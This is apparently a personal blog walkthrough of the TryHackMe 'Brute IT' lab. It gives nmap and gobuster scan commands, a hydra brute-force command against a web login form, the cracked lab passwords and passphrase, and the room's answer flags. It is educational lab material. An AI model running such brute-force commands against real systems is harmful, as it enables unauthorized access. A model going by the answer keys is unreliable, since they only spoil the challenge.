---
title: "Brute IT - TryHackMe"
author: Ludovic COULON
date: 2021-01-27
hero: ./images/hero.jpg
excerpt: "Learn how to brute, hash cracking and escalate privileges in this box!"
---

[TryHackMe | Brute IT](https://tryhackme.com/room/bruteit)

In this box you will learn about:

- Brute-force
- Hash cracking
- Privilege escalation

---

## Before attacking, let's get information about the target

### Search for open ports using nmap, how many ports are open?

```bash
Desktop/TryHackMe/brut_it » nmap -A -vv 10.10.93.226 -oN nmap_result
```

![./images/Untitled.png](./images/Untitled.png)

```bash
2 ports are open.
```

### What version of SSH is running?

```bash
OpenSSH 7.6p1
```

![./images/Untitled1.png](./images/Untitled1.png)

### What version of Apache is running?

```bash
2.4.29
```

![./images/Untitled2.png](./images/Untitled2.png)

### Which Linux distribution is running?

```bash
ubuntu
```

![./images/Untitled3.png](./images/Untitled3.png)

### Search for hidden directories on web server, what is the hidden directory?

```bash
Desktop/TryHackMe/brut_it » gobuster -u 10.10.93.226 -w /opt/directory-list-2.3-medium.txt
```

![./images/Untitled4.png](./images/Untitled4.png)

```bash
# Hidden directory 
/admin
```

---

## Find a form to get a shell on SSH.

### What is the user:password of the admin panel?

![./images/Untitled5.png](./images/Untitled5.png)

As you can see, there is the user and password in the form data, we can use this to brute-force the login with hydra.

Hidden message

![./images/Untitled6.png](./images/Untitled6.png)

```bash
# Hydra command (Pretty straightforward)
hydra -l admin -P /opt/rockyou.txt 10.10.93.226 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
```

![./images/Untitled7.png](./images/Untitled7.png)

```bash
# Credentials 
admin:xavier
```

### Crack the RSA key you found, what is John's RSA Private Key passphrase?

![./images/Untitled8.png](./images/Untitled8.png)

```bash
# Password for the private key is
rockinroll
```

### user.txt

```bash
THM{a_password_is_not_a_barrier}
```

![./images/Untitled9.png](./images/Untitled9.png)

### Web flag

![./images/Untitled10.png](./images/Untitled10.png)

```bash
THM{brut3_f0rce_is_e4sy}
```

---

### Find a form to escalate your privileges, what is the root's password?

```bash
# Password for the root user
football
```

![./images/Untitled11.png](./images/Untitled11.png)

### Root.txt

```bash
THM{pr1v1l3g3_3sc4l4t10n}
```

![./images/Untitled12.png](./images/Untitled12.png)

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://tryhackme-badges.s3.amazonaws.com/boperXD.png" alt="TryhackMeProfile" />
  </a>
</center>